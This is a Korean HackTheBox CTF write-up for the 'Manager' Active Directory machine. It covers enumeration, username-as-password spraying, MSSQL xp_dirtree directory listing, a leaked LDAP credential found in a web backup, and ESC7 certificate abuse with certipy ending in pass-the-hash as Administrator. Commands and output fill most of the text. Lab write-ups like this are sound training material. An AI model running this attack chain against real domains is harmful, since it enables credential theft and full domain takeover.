# HTB-MANAGER
```bash
OS: Windows(AD)
DATE: 26.10.20
DIFFICULTY: Medium
```

## RECON
**nmap**: 초기 접근을 위해 전체 포트 검사 및 상세 포트 검사를 진행하였다
```bash
nmap -p- -T4 IP | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49693,49694,49697,49729,49796,52913 IP | tee nmap
```
검사 결과 88, 389, 445 등등이 있는 것으로 보아 AD DC 서버의 IP 같았다. 따라서 먼저 smb 서비스부터 열거해보았다
```bash
nxc smb IP -u '' -p ''
```
초기 nxc로 돌려본 결과 manager.htb이라는 도메인 주소를 알 수 있었고, nmap 상세 검사를 통해 dc01.manager.htb이라는 도메인도 있다는 것을 알게 되어 추가해주었다
```bash
sudo nano /etc/hosts
```
이후 guest 유저로 접근과 유저명을 뽑을 수 있는지 확인해보았다
```bash
nxc smb IP -u asd -p '' --users
```
```bash
nxc smb IP -u asd -p '' --rid-brute
```
```bash
smbclient -L //manager.htb -N
```
확인 결과 guest 권한으로 smb 접근은 실패하였지만 --rid-brute를 성공하여 초기 유저명을 알 수 있게 되었다. 이후 HTTP 서비스도 열거를 진행하였다. 먼저 접속해본 결과 manager라는 사이트를 운영 중이었고 별다른 기능은 없어 보였다. 따라서 fuzzing을 진행하였다
```bash
ffuf -u http://manager.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r -c
```
```bash
ffuf -u http://manager.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -r -c
```
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://manager.htb/ -H "Host: FUZZ.manager.htb" -fs 18203
```
fuzzing 결과도 별다른 정보를 얻지 못하였다

## Initial Access

Fuzzing 결과도 좋지 못하여 아까 얻은 smb --rid-brute를 다시 한 번 봐주었다. 먼저 유저명만 남게 하는 명령어를 사용하여 users 파일에 저장해주었다
```bash
nxc smb IP -u asd -p '' --rid-brute | grep SidTypeUser | awk -F'\\\\' '{print $2}' | awk '{print $1}' | tee users
```
이후 asreproast, kerberoast, ldapsearch 등등 많은 것을 시도하였지만 불가능하였다. 따라서 username과 password를 똑같이 사용하는 유저가 있는지 확인해보았다
```bash
nxc smb IP -u users -p users
```
하지만 없어서 모두 소문자로 만들어준 후 다시 한 번 시도하였다
```bash
tr 'A-Z' 'a-z' < users > users_pass
```
```bash
nxc smb IP -u users -p users_pass --no-brute
```
그 결과 Operator라는 유저의 크레덴셜을 얻게 되었다. 이후 bloodhound를 작동시켜주었다
```bash
bloodhound-python -u operator -p operator -d manager.htb -ns IP -c all
```
확인 결과 outbound나 별다른 중요한 것은 발견하지 못하였다. 따라서 아까 nmap을 통해 알게 된 **1433 포트 MSSQL** 서버를 operator 계정으로 접근을 시도해보았다
```bash
mssqlclient.py manager.htb/operator:operator@IP

[-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'operator'.
```
하지만 operator 유저로 접근이 불가능하다고 떴다. 따라서 윈도우 도메인 계정으로 로그인하는 -windows-auth 옵션을 추가해주었다
```bash
mssqlclient.py -windows-auth manager.htb/operator:operator@IP
```
도메인 계정으로 로그인하는 것으로 다시 시도한 결과 sql 접속에 성공하였다. 따라서 db를 확인해주고 여러 테이블을 출력해보았지만 쓸 만한 것을 발견할 수 없었다. 따라서 안에서 HELP 명령어를 사용 후 무엇을 할 수 있는지 확인해보았다. 찾아본 결과 sysadmin이 아니기에 xp_cmdshell은 불가능하였지만 **xp_dirtree** 명령어를 사용할 수 있다는 것을 알게 되었다. 대상 명령어는 낮은 권한으로도 폴더 내용을 읽을 수 있는 명령어이다. 따라서 사용해주었다
```sql
SQL (MANAGER\Operator  guest@msdb)> xp_dirtree
subdirectory                depth   file
-------------------------   -----   ----
$Recycle.Bin                    1      0
Documents and Settings          1      0
inetpub                         1      0
PerfLogs                        1      0
Program Files                   1      0
Program Files (x86)             1      0
ProgramData                     1      0   
Recovery                        1      0   
SQL2019                         1      0   
System Volume Information       1      0   
Users                           1      0   
Windows                         1      0
```
따라서 계속해서 열거를 진행해보았다
```sql
SQL (MANAGER\Operator  guest@msdb)> xp_dirtree C:\inetpub\wwwroot
subdirectory                      depth   file
-------------------------------   -----   ----
about.html                            1      1
contact.html                          1      1
css                                   1      0
images                                1      0
index.html                            1      1
js                                    1      0
service.html                          1      1
web.config                            1      1
website-backup-27-07-23-old.zip       1      1
```
아까 HTTP 서비스와 연결된 `inetpub\wwwroot` 위치에 `website-backup-27-07-23-old.zip`라는 파일을 발견할 수 있었다. 따라서 이것이 inetpub, 즉 지금 돌아가고 있는 http 서비스이기에 wget으로 나의 로컬로 옮길 수 있었다
```bash
wget http://manager.htb/website-backup-27-07-23-old.zip 
```
이후 zip 압축을 풀고 확인해주었다
```bash
unzip website-backup-27-07-23-old.zip -d zip
```
확인한 결과 안에는 지금 현재 돌아가고 있는 HTTP 서비스 소스코드 등등이 있었다. 이후 ls -al로 숨겨진 파일을 확인한 결과 **.old-conf.xml**라는 비밀 파일을 발견할 수 있었다. 따라서 출력해주었다
```bash
ls -al

-rw-r--r-- 1 root root  7900 Jul 27  2023 service.html
```
```xml
cat .old-conf.xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```
확인 결과 raven이라는 유저의 크레덴셜을 얻을 수 있었다
```bash
nxc winrm IP -u raven -p 'R4v3nBe5tD3veloP3r!123'

PWN
```
따라서 쉘을 얻을 수 있게 되었다

![user](attach_real/Pasted%20image%2020261022143923.png)

## Privilege Escalation
유저 쉘에 접속 후 많은 것을 시도해보았다. 하지만 모두 다 실패하였다. 따라서 마지막으로 AD의 CA 설정을 확인해주었다. 먼저 certipy-ad find를 이용하여 스캔을 진행하였다
```bash
certipy-ad find -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip IP -vulnerable -stdout

[*] Enumeration output:                                                                                                                                                                                                                                      
Certificate Authorities                                                                                                                                                                                                                                      
  0                                                                                                                                                                                                                                                          
    CA Name                             : manager-DC01-CA                                                                                                                                                                                                    
    DNS Name                            : dc01.manager.htb                                                                                                                                                                                                   
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb                                                                                                                                                                             
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB                                                                                                                                                                                   
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00                                                                                                                                                                                          
    Certificate Validity End            : 2122-07-27 10:31:04+00:00                                                                                                                                                                                          
    Web Enrollment                                                                                                                                                                                                                                           
      HTTP                                                                                                                                                                                                                                                   
        Enabled                         : False
      HTTPS                                                    
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions                                                
      Owner                             : MANAGER.HTB\Administrators
      Access Rights                                            
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
    [+] User Enrollable Principals      : MANAGER.HTB\Raven
                                          MANAGER.HTB\Authenticated Users
    [+] User ACL Principals             : MANAGER.HTB\Raven
    [!] Vulnerabilities                                        
      ESC7                              : User has dangerous permissions.
Certificate Templates                   : [!] Could not find any certificate templates
```
확인 결과 CA Name도 알 수 있었고 ESC7 취약점이 있다는 것을 알게 되었다. 또한 raven이 ManageCa/ManageCertificates를 가진 것 또한 알게 되었다. 따라서 raven을 officer로 등록해주었다
```bash
certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip IP -target dc01.manager.htb

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```
성공 후 SubCA 템플릿을 활성화해주었다. ManageCa 권한으로 이걸 켜주고 SubCA를 쓰는 이유는, 신청하면 자동 거부되고 그게 보류 상태를 만들어서 Officer 권한으로 강제 승인하는 ESC7 시나리오에 맞기 때문이다. 이후 administrator 이름으로 신청해주었다
```bash
certipy-ad req -ca 'manager-DC01-CA' -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip IP -target dc01.manager.htb

[*] Request ID is 19              ← 보류번호 (챙겨둬!)
CERTSRV_E_TEMPLATE_DENIED         ← 거부 = 보류 상태 생성 = 설계된 동작
Saving private key to '19.key'    ← 개인키 저장됨 (나중에 필요)
```
여기서 -upn은 인증서에 박히는 주인 이름을 넣는 것으로, 발급될 신분증 주인이 admin이 된다. 출력은 오류가 나는 게 정상이다. 보류가 되기 때문이다. ID 19는 예시가 아니라 내 환경의 실제 번호이다. 다음으로 보류된 19번을 officer 권한으로 승인시켜주었다
```bash
certipy-ad ca -ca 'manager-DC01-CA' -issue-request 19 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip IP -target dc01.manager.htb

[*] Successfully issued certificate
```
아까 얻은 officer 권한으로 거부됐던 19번을 억지로 승인됨으로 바꾸었다. 이제 마지막으로 승인된 인증서를 받아주었다
```bash
certipy-ad req -ca 'manager-DC01-CA' -retrieve 19 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip IP -target dc01.manager.htb

[*] Saving certificate and private key to 'administrator.pfx'
```
이로써 승인된 인증서를 받아서, 아까 저장된 19.key와 자동으로 합쳐 .pfx 파일(인증서)을 만들었다. 따라서 인증서로 해시를 추출해주었다
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip IP
```
마지막으로 administrator NTLM 해시까지 얻어주어 이제 PTH가 가능해졌으므로 winrm에 접근하여 root 플래그를 얻을 수 있게 되었다
```bash
evil-winrm -i IP -u Administrator -H hash
```

![root](attach_real/Pasted%20image%2020261022221947.png)

## New Inform
- 항상 이름:똑같은 pass 확인하자
- 만약에 없으면 `tr 'A-Z' 'a-z' < users > users_pass`를 사용하여 모두 소문자나 대문자 워드리스트도 만들어주자
- MSSQL은 로그인 방식이 두 가지이다. 1. SQL Server authentication: SQL 자체 계정으로 하는 것이다. 2. Windows authentication(윈도우/도메인 계정)으로 로그인하는 것이다. operator는 sql 계정이 아니라 도메인 유저이기 때문에 무조건 -windows-auth 옵션을 추가해줘야 함
- MSSQL에서 use DB; 형태로 DB를 바꿔줄 수 있다
- MSSQL은 저장 프로시저라는 것이 있다. 그냥 데이터만 저장하는 게 아니라 미리 만들어둔 기능들을 호출할 수 있다
- xp_dirtree는 폴더의 구조를 보여주는 확장 프로시저이다. 사용 방법은 `xp_dirtree 'C:\users'` 형식이다
- inetpub/wwwroot 안에는 실제로 접근할 수 있다. like wget
- AD의 CA에서 인증서는 디지털 신분증이다. 윈도우 도메인에선 비번 대신 인증서로 로그인할 수 있다
- CA란 신분증을 발급해주는 기관. 아무나 신분증을 만들면 의미 없기에, CA라는 공식 기관이 보증하고 발급한 신분증에만 도장을 찍어준다
- AD CA에서 템플릿은 신분증의 종류 및 양식이다. 예를 들어 각 템플릿마다 "이 양식은 누가 신청할 수 있다" 이런 규칙이 정해진 것
- ESC7: AD CS는 설정을 잘못하면 뚫린다. 그 설정 실수 유형들을 보안 연구자들이 ESC1~ESC8 번호로 정의해놨다. 여기서 ESC7은 **일반 사원이 발급기(CA)의 관리자 권한을 잘못 갖고 있는 경우**
- AD CA 관련 취약점을 할 때 -target에 IP를 박으면 certipy가 다른 내부 단계에서 도메인 이름을 쓰려고 한다. 따라서 정확히 DC01이라는 도메인을 사용하여 매핑을 시켜줘야 한다
- 항상 AD 할 때 CA 확인하자
- pfx로 인증하여 hash 받을 수 있음